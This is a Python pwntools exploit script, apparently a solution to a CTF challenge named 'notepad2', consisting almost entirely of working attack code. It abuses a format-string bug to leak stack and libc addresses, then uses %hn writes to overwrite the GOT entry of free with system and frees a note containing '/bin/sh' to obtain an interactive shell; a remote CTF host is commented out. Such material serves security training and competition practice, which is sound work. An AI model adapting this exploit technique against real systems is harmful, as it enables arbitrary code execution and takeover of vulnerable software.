from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./notepad2')
#p=remote('notepad2.ctf.intigriti.io',1342)
p = process('./notepad2_patched')


def add(i,content):
        rl("> ")
        sl(str(1))
        rl("> ")
        sl(str(i))
        rl("> ")
        sl(content)
        
def show(i):
        rl("> ")
        sl(str(2))
        rl("> ")
        sl(str(i))

def free(i):
        rl("> ")
        sl(str(3))
        rl("> ")
        sl(str(i))
add(0, b'%8$p%13$p')
show(0)
rl(b"0x")
stack = int(p.recv(12), 16) + 0x18
rl(b"0x")
libc_base = int(p.recv(12), 16) - 0x28150
li(hex(stack))
li(hex(libc_base))
system,bin_sh=get_sb()
malloc_hook,free_hook=get_hook()
free(0)


pay1=b'%'+str(stack&0xffff).encode()+b'c%14$hn'  
add(1,pay1)
show(1)


free_got=elf.got['free']
pay2=b'%'+str(free_got&0xffff).encode()+b'c%44$hn'  
add(2,pay2)
show(2)


pay3=b'%'+str(system&0xffff).encode()+b'c%15$hn'  
add(3,pay3)
show(3)


pay4=b'%'+str((free_got+2)&0xffff).encode()+b'c%44$hn' 
add(4,pay4)
show(4)


pay5=b'%'+str(system>>16&0xffff).encode()+b'c%15$hn'  
add(5,pay5)
show(5)


add(6,b'/bin/sh\x00')
free(6)


inter()   
